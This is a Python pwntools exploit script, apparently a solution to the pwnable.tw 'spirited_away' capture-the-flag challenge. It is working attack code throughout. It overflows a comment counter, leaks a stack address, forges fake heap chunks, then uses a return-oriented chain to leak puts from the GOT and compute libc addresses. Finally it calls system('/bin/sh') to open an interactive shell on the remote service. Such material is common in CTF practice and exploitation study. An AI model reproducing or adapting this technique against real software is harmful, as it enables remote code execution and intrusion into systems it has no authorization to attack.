from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./spirited_away')
	puts_offset = 0x05fca0
	system_offset = 0x03ada0
	binsh_offset = 0x15ba0b
else:
	host, port = "chall.pwnable.tw", 10204
	r = remote(host, port)
	libc = ELF('./libc_32.so.6')
	puts_offset = libc.symbols['puts']
	system_offset = libc.symbols['system']
	binsh_offset = next(libc.search('/bin/sh'))
	
raw_input('debug')

def survey(name, age, reason, comment, choise):
	r.sendlineafter("\nPlease enter your name: ", name)
	r.sendlineafter("Please enter your age: ", age)
	r.sendlineafter("Why did you came to see this movie? ", reason)
	r.sendlineafter("Please enter your comment: ", comment)
	r.sendlineafter("Would you like to leave another comment? <y/n>: ", choise)
	
name = 'linh'
age = '6'
reason = 'c'*0x37
comment = 'y'	
for i in range(100):
	if i < 10:
		r.sendlineafter("\nPlease enter your name: ", name)
	r.sendlineafter("Please enter your age: ", age)
	r.sendlineafter("Why did you came to see this movie? ", reason)
	if i <10 :
		r.sendlineafter("Please enter your comment: ", comment)
	r.sendlineafter("Would you like to leave another comment? <y/n>: ", "y")	
	
r.sendlineafter("\nPlease enter your name: ", 'linh')
r.sendlineafter("Please enter your age: ", '7')
r.sendlineafter("Why did you came to see this movie? ", 'c'*0x37)
r.sendlineafter("Please enter your comment: ", 'y')
r.recvuntil("7")
res = r.recv(65)
leak = u32(r.recv(4))
log.info("stack = %#x" %leak)
r.sendlineafter("Would you like to leave another comment? <y/n>: ", "y")

fake_chunk = leak - 0x6c

name = "linh"
age = '8'
reason = 'c'*0x4 + p32(0x41) + 'a'*0x3c + p32(0x1009)
comment = 'd'*0x50 + p32(8) + p32(fake_chunk + 0x4)
survey(name, age, reason, comment, "y")


puts_plt = 0x80484a0
puts_got = 0x804a020
name = 'a'*0x4c + p32(puts_plt) + p32(0x0804860d ) + p32(puts_got)
reason = 'c'
comment = 'dddd'
survey(name, age, reason, comment, 'n')
r.recvuntil("Bye!")
r.recv(1)
res = r.recv(4)
puts_add = u32(res)
log.info("puts_add = %#x" %puts_add)
libc_base = puts_add - puts_offset
system_add = libc_base + system_offset
binsh_add = libc_base + binsh_offset

survey('linh', '10', 'aaaa', 'bbbb', 'y')

fake_chunk = leak - 0x64
name = "linh"
age = '11'
reason = 'c'*0x4 + p32(0x41) + 'a'*0x3c + p32(0x1009)
comment = 'd'*0x50 + p32(11) + p32(fake_chunk + 0x4)
survey(name, age, reason, comment, "y")

name = 'a'*0x4c + p32(system_add) + p32(0x0804860d ) + p32(binsh_add)
reason = 'c'
comment = 'dddd'
survey(name, age, reason, comment, 'n')

r.interactive()
r.close()
